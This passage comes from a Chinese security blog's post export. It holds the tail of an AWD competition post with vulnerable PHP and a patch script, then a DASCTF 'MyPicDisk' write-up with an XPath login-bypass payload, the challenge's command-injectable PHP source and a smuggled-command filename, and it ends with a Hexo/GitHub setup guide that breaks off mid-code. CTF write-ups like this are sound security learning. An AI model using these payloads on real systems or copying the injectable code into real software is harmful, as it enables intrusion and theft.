class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-1 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-2 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_contents</span>(<span class="variable">$time</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat_more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">cat_contents</span>(<span class="variable">$catid</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="comment">//print_r($data);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$pic</span>, <span class="string">&quot;flag&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>patch.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;/var/www/html/config/config.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.remove(file_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;File <span class="subst">&#123;file_path&#125;</span> has been successfully deleted.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error deleting <span class="subst">&#123;file_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>应急响应考察更多的是一些木马和勒索病毒的知识，模式与ctf答题模式差不多，只不过每道题给分是固定的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次打 dawd 模式，感觉 dawd 是 awd 的简化版，没有不死马这种一次打中每次都能拿分的骚操作，更加考验大家写脚本的速度和熟练度。</p><p>比赛有点水，主要靠dawd攻防拉分，因为我们队第三轮就开始拿分，等别的队伍开始拿分的时候就已经甩开好多分数了。</p><p>应急响应最后只差3道题没答上来，我没做几道题，主要靠队友c，队友tql。</p>]]></content>
      
      
      <categories>
          
          <category> awd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技术 </tag>
            
            <tag> rce </tag>
            
            <tag> php </tag>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[DASCTF 2023 &amp; 0X401七月暑期挑战赛] MyPicDisk</title>
      <link href="/2023/07/27/2023dasctf_MyPicDisk/"/>
      <url>/2023/07/27/2023dasctf_MyPicDisk/</url>
      
        <content type="html"><![CDATA[<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>开启容器，发现以下表单，表单信息通过post方法传送</p><img src="/2023/07/27/2023dasctf_MyPicDisk/1.png" class=""><p>通过xpath万能注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;&amp;password=&#x27;]|//*|//*[&#x27;&amp;submit=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>注入成功，burp观察返回包发现注释信息获得提示下载源码&#x2F;y0u_cant_find_1t.zip</p><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span> . <span class="variable language_">$this</span>-&gt;filename . <span class="string">&quot;  Last Modified Time: &quot;</span> . <span class="variable language_">$this</span>-&gt;lasttime . <span class="string">&quot;  Filesize: &quot;</span> . <span class="variable language_">$this</span>-&gt;size . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span> . <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">    <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">      <span class="variable">$x_query</span> = <span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">      <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">          <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">          <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>分析源码，发现有文件上传白名单（jpg|jpeg|gif|png|bmp后缀名）</p><p>继续分析，发现class FILE的<code>system(&quot;ls -all &quot; . $this-&gt;filename);</code>处存在命令拼接</p><p>但是有条件，必须保证文件名有且只有一个<code>.</code>，并且不能含有<code>\/</code></p><p>接下来想方法绕过</p><p>首先上传文件1111.jpg，文件内容为<code>ls /</code>用来查看根目录flag文件名</p><p>接下来上传名为<code>;`cat 111*`;1.jpg</code>的文件再进行<code>?filename=;`cat 111*`;1.jpg&amp;todo=show</code>，发现成功执行了命令，返回得到flag路径<code>adjaskdhnask_flag_is_here_dakjdnmsakjnfksd</code></p><p>最后更换文件内容为<code>cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd</code>，再次执行命令得到flag</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h3><p>题目中xpath查询语句拼接后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/accounts/user[username=&#x27;admin&#x27;&#x27; and password=&#x27;&#x27;]|//*|//*[&#x27;&#x27;]</span><br></pre></td></tr></table></figure><p>其实后面不重要，因为admin的引号已经将查询语句闭合了</p><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/accounts/user[username=&#x27;admin&#x27;]</span><br></pre></td></tr></table></figure><p>于是相当于查询是否有admin账户，得到结果</p><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p><code>;</code>可以分隔一串命令</p><p><code>`</code>Linux中反引号的作用是在将反引号内的命令处理完毕之后，会将返回的信息传给反引号的位置，再次执行命令</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了网上好多wp，发现我的做法貌似是非预期</p><p>预期解是md5_file函数结合phar打的</p><p>太菜了太菜了，别的题目为什么不写wp，因为都不会。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技术 </tag>
            
            <tag> xpath注入 </tag>
            
            <tag> rce </tag>
            
            <tag> php </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用hexo框架搭建github静态博客</title>
      <link href="/2023/06/30/hexo/"/>
      <url>/2023/06/30/hexo/</url>
      
        <content type="html"><![CDATA[<p>第一次使用 hexo 搭建静态网站，踩了好多坑，立此贴记录一下</p><h2 id="本地配置Hexo"><a href="#本地配置Hexo" class="headerlink" title="本地配置Hexo"></a>本地配置Hexo</h2><h3 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h3><p><a href="https://nodejs.org/zh-cn">Nodejs官方地址</a></p><p>从以上链接下载 nodejs 安装（官网下载稍慢，建议翻墙）</p><h3 id="设置npm淘宝镜像站"><a href="#设置npm淘宝镜像站" class="headerlink" title="设置npm淘宝镜像站"></a>设置npm淘宝镜像站</h3><p>npm 默认的源的下载速度可能很慢，建议使用淘宝镜像替换。执行下面的命令，将 npm 的源设置成淘宝镜像站。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry &quot;https://registry.npm.taobao.org&quot;</span><br></pre></td></tr></table></figure><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p><a href="https://git-scm.com/downloads/">git官方链接</a></p><p>从以上链接下载 git 安装</p><p>一路确认，安装时要勾选 <strong>Add to PATH</strong> 选项</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>cmd 输入以下命令观察是否执行正确</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><h3 id="初始化Hexo"><a href="#初始化Hexo" class="headerlink" title="初始化Hexo"></a>初始化Hexo</h3><p>执行以下命令安装 hexo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli g</span><br></pre></td></tr></table></figure><p>在电脑的某个磁盘或路径新建一个文件夹(名字可以随便取)，比如我的是 D:\blog，由于这个文件夹将来就作为您存放博客的地方，所以最好不要随便放</p><p>在 D:\blog 文件夹下右键打开 Git Bash Here，输入命令: <code>hexo init</code> 进行初始化</p><p>hexo 会自动下载一些文件到这个目录</p><p>接着在 cmd 中安装其他 hexo 插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-admin --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure><p>至此，本地 hexo 配置完毕。</p><p>现在可以使用 hexo 搭建本地服务器来使用</p><p>使用 <code>hexo g</code> 生成静态页面，使用 <code>hexo s</code> 开启本地服务器，接下来可以用浏览器地址栏输入 <code>localhost:4000</code> 来看见刚刚创建的博客</p><h2 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h2><h3 id="配置-Github"><a href="#配置-Github" class="headerlink" title="配置 Github"></a>配置 Github</h3><p>注册 github 账号，并在主页创建仓库，名字为 [yourname].github.io</p><h4 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h4><p>打开git bash终端设置 user.name 和 user.email</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>生成ssh密匙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>将公匙添加到 github 上</p><h3 id="将hexo博客部署到github上"><a href="#将hexo博客部署到github上" class="headerlink" title="将hexo博客部署到github上"></a>将hexo博客部署到github上</h3><p>修改配置文件 <strong>blog&#x2F;_config.yml</strong>，修改deploy项的内容，如下所示：</p><img src="/2023/06/30/hexo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE1.png" class=""><p>注意：</p><ul><li>分支（branch）要与自己创建仓库的分支名称一致（注意master与main的区别）</li><li>冒号后面必须添加一个空格</li><li>保持缩进格式一致</li></ul><p>给出示例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> <span 